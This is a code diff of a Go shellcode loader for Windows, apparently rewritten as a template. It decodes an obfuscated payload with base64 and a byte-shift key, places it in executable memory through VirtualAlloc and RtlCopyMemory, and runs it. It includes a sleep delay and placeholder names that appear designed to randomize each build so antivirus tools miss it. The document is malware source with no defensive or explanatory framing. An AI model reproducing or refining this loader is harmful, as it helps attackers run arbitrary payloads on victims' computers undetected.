@@ -13,9 +13,7 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
-var kk = []byte{0x23, 0x32}
-
-
+var $keyName []byte
 
 
 var (
@@ -25,25 +23,25 @@ var (
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
-func getDeCode(string2 string) []byte {
+func $getDeCode(string2 string) []byte {
 
 	ss, _ := base64.StdEncoding.DecodeString(string2)
 	string2 = string(ss)
-	var shellcode []byte
+	var code []byte
 
 	bydata := []byte(string2)
 
 	for i := 0; i < len(bydata); i++ {
-		shellcode = append(shellcode, bydata[i]-kk[0]+kk[1])
+		code = append(code, bydata[i]-$keyName[0]+$keyName[1])
 	}
-	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
+	ssb, _ := base64.StdEncoding.DecodeString(string(code))
 	return ssb
 
 }
 
 
 
-func genEXE(charcode []byte) {
+func $genEXE(charcode []byte) {
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if err != nil && err.Error() != "The operation completed successfully." {
@@ -57,19 +55,24 @@ func genEXE(charcode []byte) {
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
-func gd() int64 {
+func $gd() int {
 	time.Sleep(time.Duration(2) * time.Second)
 
-	dd := time.Now().UTC().UnixNano()
-	return dd + 123456
+	dd := time.Now().UTC().Day()
+	var num = 1
+        for num <= 5 {
+            num++
+        }
+	return dd + time.Now().Second()
 
 }
 
 
 
 func main() {
-	bbdata := "${bdata}"
-	shellCodeHex := getDeCode(bbdata)
-	gd()
-	genEXE(shellCodeHex)
+	$bbdata := "$bdata"
+	$keyName = []byte($keys)
+	$shellCodeHex := $getDeCode($bbdata)
+	$gd()
+	$genEXE($shellCodeHex)
 }
